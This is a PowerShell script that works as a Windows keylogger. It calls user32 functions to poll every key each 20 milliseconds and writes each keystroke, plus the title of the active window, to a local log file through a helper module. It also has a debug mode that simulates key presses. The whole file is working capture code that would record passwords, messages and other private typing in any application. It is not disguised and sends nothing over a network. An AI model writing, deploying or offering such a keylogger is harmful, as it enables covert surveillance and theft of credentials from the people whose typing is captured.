#TODO: add chromebook support (maybe)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetKeyState(int vKey);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToAscii(
        uint uVirtKey,
        uint uScanCode,
        byte[] lpKeyState,
        byte[] lpChar,
        uint uFlags
    );
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")]
    public static extern int GetWindowTextLength(IntPtr hWnd);
}
"@

$VK_LBUTTON = 0x01
$VK_RBUTTON = 0x02
$VK_CANCEL = 0x03
$VK_MBUTTON = 0x04
$VK_XBUTTON1 = 0x05
$VK_XBUTTON2 = 0x06
$VK_BACK = 0x08
$VK_TAB = 0x09
$VK_CLEAR = 0x0C
$VK_RETURN = 0x0D
$VK_SHIFT = 0x10
$VK_CONTROL = 0x11
$VK_MENU = 0x12
$VK_PAUSE = 0x13
$VK_CAPITAL = 0x14
$VK_KANA = 0x15
$VK_JUNJA = 0x17
$VK_FINAL = 0x18
$VK_HANJA = 0x19
$VK_ESCAPE = 0x1B
$VK_CONVERT = 0x1C
$VK_NONCONVERT = 0x1D
$VK_ACCEPT = 0x1E
$VK_MODECHANGE = 0x1F
$VK_SPACE = 0x20
$VK_PRIOR = 0x21
$VK_NEXT = 0x22
$VK_END = 0x23
$VK_HOME = 0x24
$VK_LEFT = 0x25
$VK_UP = 0x26
$VK_RIGHT = 0x27
$VK_DOWN = 0x28
$VK_SELECT = 0x29
$VK_PRINT = 0x2A
$VK_EXECUTE = 0x2B
$VK_SNAPSHOT = 0x2C
$VK_INSERT = 0x2D
$VK_DELETE = 0x2E
$VK_HELP = 0x2F
$VK_0 = 0x30
$VK_9 = 0x39
$VK_A = 0x41
$VK_Z = 0x5A
$VK_LWIN = 0x5B
$VK_RWIN = 0x5C
$VK_APPS = 0x5D
$VK_SLEEP = 0x5F
$VK_NUMPAD0 = 0x60
$VK_NUMPAD9 = 0x69
$VK_MULTIPLY = 0x6A
$VK_ADD = 0x6B
$VK_SEPARATOR = 0x6C
$VK_SUBTRACT = 0x6D
$VK_DECIMAL = 0x6E
$VK_DIVIDE = 0x6F
$VK_F1 = 0x70
$VK_F24 = 0x87
$VK_NUMLOCK = 0x90
$VK_SCROLL = 0x91
$VK_LSHIFT = 0xA0
$VK_RSHIFT = 0xA1
$VK_LCONTROL = 0xA2
$VK_RCONTROL = 0xA3
$VK_LMENU = 0xA4
$VK_RMENU = 0xA5
$VK_OEM_1 = 0xBA
$VK_OEM_PLUS = 0xBB
$VK_OEM_COMMA = 0xBC
$VK_OEM_MINUS = 0xBD
$VK_OEM_PERIOD = 0xBE
$VK_OEM_2 = 0xBF
$VK_OEM_3 = 0xC0
$VK_OEM_4 = 0xDB
$VK_OEM_5 = 0xDC
$VK_OEM_6 = 0xDD
$VK_OEM_7 = 0xDE
$VK_OEM_8 = 0xDF
$VK_OEM_102 = 0xE2

$ModulePath = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Definition) "PCLogger.psm1"
if (Test-Path $ModulePath) {
    Import-Module $ModulePath -Force
} else {
    Write-Host "PCLogger module not found at $ModulePath"
    return
}

$BaseLogDir = Get-PCLogFolder -CreateIfMissing
$LogFile = Join-Path $BaseLogDir "logs.log"

$Interval = 20
$Debug = $false

$LogDirectory = Split-Path $LogFile -Parent
if (-not (Test-Path $LogDirectory)) {
    New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
}

function Convert-VirtualKeyToChar {
    param (
        [int]$VirtualKey,
        [byte[]]$KeyboardState
    )
    $ScanCode = [User32]::MapVirtualKey($VirtualKey, 0)
    $CharBuffer = New-Object byte[] 2
    $Result = [User32]::ToAscii($VirtualKey, $ScanCode, $KeyboardState, $CharBuffer, 0)
    if ($Result -gt 0) {
        return [System.Text.Encoding]::UTF8.GetString($CharBuffer, 0, $Result)
    }
    return $null
}

function Simulate-KeyPress {
    param([int]$VirtualKey)
    $KeyName = "VK_UNKNOWN (0x$("{0:X2}" -f $VirtualKey))"
    Get-Variable -Name "VK_*" -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.Value -eq $VirtualKey) {
            $KeyName = $_.Name
        }
    }
    Write-Host "Simulating key press: $KeyName ($VirtualKey)"
}

function Test-AllKeys {
    Write-Host "--- DEBUG MODE: Testing All Keys ---"
    Write-Host "This will simulate pressing every virtual key (0x01-0xFF)."
    Write-Host "This does NOT physically press keys on your keyboard."
    Add-Content -Path $LogFile -Value "`n`n--- DEBUG MODE TEST START: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ---`n"
    $script:LastKeyState = New-Object byte[] 256
    $vkCodeToName = @{}
    Get-Variable -Name "VK_*" -ErrorAction SilentlyContinue | ForEach-Object {
        $vkCodeToName[$_.Value] = $_.Name
    }
    $modifierStates = @{
        "None" = @{ Shift = $false; Ctrl = $false; Alt = $false }
        "Shift" = @{ Shift = $true; Ctrl = $false; Alt = $false }
        "Ctrl" = @{ Shift = $false; Ctrl = $true; Alt = $false }
        "Alt" = @{ Shift = $false; Ctrl = $false; Alt = $true }
    }
    foreach ($modifierName in $modifierStates.Keys) {
        $modifiers = $modifierStates[$modifierName]
        Write-Host "`nTesting with modifiers: $modifierName"
        Add-Content -Path $LogFile -Value "`n[DEBUG] Testing with modifiers: $modifierName`n"
        $mockKeyboardState = New-Object byte[] 256
        if ($modifiers.Shift) { $mockKeyboardState[$VK_SHIFT] = 0x80; $mockKeyboardState[$VK_LSHIFT] = 0x80; $mockKeyboardState[$VK_RSHIFT] = 0x80 }
        if ($modifiers.Ctrl) { $mockKeyboardState[$VK_CONTROL] = 0x80; $mockKeyboardState[$VK_LCONTROL] = 0x80; $mockKeyboardState[$VK_RCONTROL] = 0x80 }
        if ($modifiers.Alt) { $mockKeyboardState[$VK_MENU] = 0x80; $mockKeyboardState[$VK_LMENU] = 0x80; $mockKeyboardState[$VK_RMENU] = 0x80 }
        $mockKeyboardState[$VK_CAPITAL] = 0x01
        for ($i = 0x01; $i -le 0xFF; $i++) {
            if ($i -ge $VK_LBUTTON -and $i -le $VK_XBUTTON2) { continue }
            $IsKeyPressed = $true
            if ($IsKeyPressed -and ($script:LastKeyState[$i] -eq 0)) {
                $Character = $null
                if ($i -eq $VK_RETURN) { $Character = "[ENTER]" }
                elseif ($i -eq $VK_BACK) { $Character = "[BACKSPACE]" }
                elseif ($i -eq $VK_SPACE) { $Character = " " }
                elseif ($i -eq $VK_TAB) { $Character = "[TAB]" }
                elseif ($i -eq $VK_ESCAPE) { $Character = "[ESC]" }
                elseif ($i -eq $VK_INSERT) { $Character = "[INSERT]" }
                elseif ($i -eq $VK_DELETE) { $Character = "[DELETE]" }
                elseif ($i -eq $VK_HOME) { $Character = "[HOME]" }
                elseif ($i -eq $VK_END) { $Character = "[END]" }
                elseif ($i -eq $VK_PRIOR) { $Character = "[PAGE UP]" }
                elseif ($i -eq $VK_NEXT) { $Character = "[PAGE DOWN]" }
                elseif ($i -eq $VK_LEFT) { $Character = "[LEFT ARROW]" }
                elseif ($i -eq $VK_UP) { $Character = "[UP ARROW]" }
                elseif ($i -eq $VK_RIGHT) { $Character = "[RIGHT ARROW]" }
                elseif ($i -eq $VK_DOWN) { $Character = "[DOWN ARROW]" }
                elseif ($i -ge $VK_F1 -and $i -le $VK_F24) { $Character = "[F$($i - $VK_F1 + 1)]" }
                elseif ($i -ge $VK_NUMPAD0 -and $i -le $VK_NUMPAD9) { $Character = "[NUM $ ($i - $VK_NUMPAD0)]" }
                elseif ($i -eq $VK_DECIMAL) { $Character = "[NUM .]" }
                elseif ($i -eq $VK_MULTIPLY) { $Character = "[NUM *]" }
                elseif ($i -eq $VK_ADD) { $Character = "[NUM +]" }
                elseif ($i -eq $VK_SUBTRACT) { $Character = "[NUM -]" }
                elseif ($i -eq $VK_DIVIDE) { $Character = "[NUM /]" }
                elseif ($i -eq $VK_CAPITAL) {
                    $capsState = ([User32]::GetKeyState($VK_CAPITAL) -band 0x0001) -ne 0
                    if ($capsState) { $Character = "[CAPS LOCK ON]" } else { $Character = "[CAPS LOCK OFF]" }
                } 
                elseif ($i -eq $VK_NUMLOCK) {
                     $numLockState = ([User32]::GetKeyState($VK_NUMLOCK) -band 0x0001) -ne 0
                     if ($numLockState) { $Character = "[NUM LOCK ON]" } else { $Character = "[NUM LOCK OFF]" }
                }
                elseif ($i -eq $VK_SCROLL) {
                    $scrollLockState = ([User32]::GetKeyState($VK_SCROLL) -band 0x0001) -ne 0
                    if ($scrollLockState) { $Character = "[SCROLL LOCK ON]" } else { $Character = "[SCROLL LOCK OFF]" }
                }
                elseif ($i -eq $VK_LSHIFT -or $i -eq $VK_RSHIFT) { $Character = "[SHIFT]" }
                elseif ($i -eq $VK_LCONTROL -or $i -eq $VK_RCONTROL) { $Character = "[CTRL]" }
                elseif ($i -eq $VK_LMENU -or $i -eq $VK_RMENU) { $Character = "[ALT]" }
                elseif ($i -eq $VK_LWIN -or $i -eq $VK_RWIN) { $Character = "[WIN]" }
                elseif ($i -eq $VK_APPS) { $Character = "[APPS]" }
                else {
                    $Character = Convert-VirtualKeyToChar $i $mockKeyboardState
                }
                
                $keyName = if ($vkCodeToName[$i]) { $vkCodeToName[$i] } else { "0x$("{0:X2}" -f $i)" }
                $charDisplay = if ($Character) { $Character } else { '[NO CHAR]' }
                $LogEntry = "[DEBUG] $keyName (VK: 0x$("{0:X2}" -f $i)) - Detected: $charDisplay"
                Add-Content -Path $LogFile -Value $LogEntry -Encoding UTF8
            }
            $script:LastKeyState[$i] = [int]$IsKeyPressed 
        }
        $script:LastKeyState = New-Object byte[] 256
    }
    Add-Content -Path $LogFile -Value "`n--- DEBUG MODE TEST END: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ---`n"
    Write-Host "--- DEBUG MODE TEST COMPLETE ---"
    exit
}

function Start-logger {
    Write-Host "Starting.. Press Ctrl+C to stop."
    Write-Host "Outputting to: $LogFile"
    try {
        $LastActiveWindow = ""
        $script:LastKeyState = New-Object byte[] 256
        while ($true) {
            Start-Sleep -Milliseconds $Interval
            $hWnd = [User32]::GetForegroundWindow()
            if ($hWnd -ne [IntPtr]::Zero) {
                $Length = [User32]::GetWindowTextLength($hWnd)
                $SB = New-Object Text.StringBuilder ($Length + 1)
                [User32]::GetWindowText($hWnd, $SB, $SB.Capacity)
                $CurrentActiveWindow = $SB.ToString()
                if ($CurrentActiveWindow -ne $LastActiveWindow) {
                    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    Add-Content -Path $LogFile -Value "`n`n[$Timestamp] Active Window: $CurrentActiveWindow`n"
                    $LastActiveWindow = $CurrentActiveWindow
                }
            }
            $CurrentKeyboardState = New-Object byte[] 256
            [User32]::GetKeyboardState($CurrentKeyboardState) | Out-Null
            for ($i = 0x01; $i -le 0xFF; $i++) {
                $IsKeyPressed = (([User32]::GetAsyncKeyState($i) -band 0x8000) -ne 0)
                if ($IsKeyPressed -and ($script:LastKeyState[$i] -eq 0)) {
                    $Character = $null
                    if ($i -eq $VK_RETURN) { $Character = "[ENTER]" }
                    elseif ($i -eq $VK_BACK) { $Character = "[BACKSPACE]" }
                    elseif ($i -eq $VK_SPACE) { $Character = " " }
                    elseif ($i -eq $VK_TAB) { $Character = "[TAB]" }
                    elseif ($i -eq $VK_ESCAPE) { $Character = "[ESC]" }
                    elseif ($i -eq $VK_INSERT) { $Character = "[INSERT]" }
                    elseif ($i -eq $VK_DELETE) { $Character = "[DELETE]" }
                    elseif ($i -eq $VK_HOME) { $Character = "[HOME]" }
                    elseif ($i -eq $VK_END) { $Character = "[END]" }
                    elseif ($i -eq $VK_PRIOR) { $Character = "[PAGE UP]" }
                    elseif ($i -eq $VK_NEXT) { $Character = "[PAGE DOWN]" }
                    elseif ($i -eq $VK_LEFT) { $Character = "[LEFT ARROW]" }
                    elseif ($i -eq $VK_UP) { $Character = "[UP ARROW]" }
                    elseif ($i -eq $VK_RIGHT) { $Character = "[RIGHT ARROW]" }
                    elseif ($i -eq $VK_DOWN) { $Character = "[DOWN ARROW]" }
                    elseif ($i -ge $VK_F1 -and $i -le $VK_F24) { $Character = "[F$($i - $VK_F1 + 1)]" }
                    elseif ($i -ge $VK_NUMPAD0 -and $i -le $VK_NUMPAD9) { $Character = "[NUM $ ($i - $VK_NUMPAD0)]" }
                    elseif ($i -eq $VK_DECIMAL) { $Character = "[NUM .]" }
                    elseif ($i -eq $VK_MULTIPLY) { $Character = "[NUM *]" }
                    elseif ($i -eq $VK_ADD) { $Character = "[NUM +]" }
                    elseif ($i -eq $VK_SUBTRACT) { $Character = "[NUM -]" }
                    elseif ($i -eq $VK_DIVIDE) { $Character = "[NUM /]" }
                    elseif ($i -eq $VK_CAPITAL) {
                        $capsState = ([User32]::GetKeyState($VK_CAPITAL) -band 0x0001) -ne 0
                        if ($capsState) { $Character = "[CAPS LOCK ON]" } else { $Character = "[CAPS LOCK OFF]" }
                    }
                    elseif ($i -eq $VK_NUMLOCK) {
                        $numLockState = ([User32]::GetKeyState($VK_NUMLOCK) -band 0x0001) -ne 0
                        if ($numLockState) { $Character = "[NUM LOCK ON]" } else { $Character = "[NUM LOCK OFF]" }
                    }
                    elseif ($i -eq $VK_SCROLL) {
                        $scrollLockState = ([User32]::GetKeyState($VK_SCROLL) -band 0x0001) -ne 0
                        if ($scrollLockState) { $Character = "[SCROLL LOCK ON]" } else { $Character = "[SCROLL LOCK OFF]" }
                    }
                    elseif ($i -eq $VK_LSHIFT -or $i -eq $VK_RSHIFT) { $Character = "[SHIFT]" }
                    elseif ($i -eq $VK_LCONTROL -or $i -eq $VK_RCONTROL) { $Character = "[CTRL]" }
                    elseif ($i -eq $VK_LMENU -or $i -eq $VK_RMENU) { $Character = "[ALT]" }
                    elseif ($i -eq $VK_LWIN -or $i -eq $VK_RWIN) { $Character = "[WIN]" }
                    elseif ($i -eq $VK_APPS) { $Character = "[APPS]" }
                    else {
                        $Character = Convert-VirtualKeyToChar $i $CurrentKeyboardState
                    }
                    if ($Character) {
                        Add-Content -Path $LogFile -Value $Character -Encoding UTF8
                    }
                }
                $script:LastKeyState[$i] = [int]$IsKeyPressed
            }
        }
    }
    catch {
        Write-Error "An error occurred: $($_.Exception.Message)"
    }
    finally {
        Write-Host "Stopped."
    }
}

if ($Debug) {
    Test-AllKeys
} else {
    Start-logger
}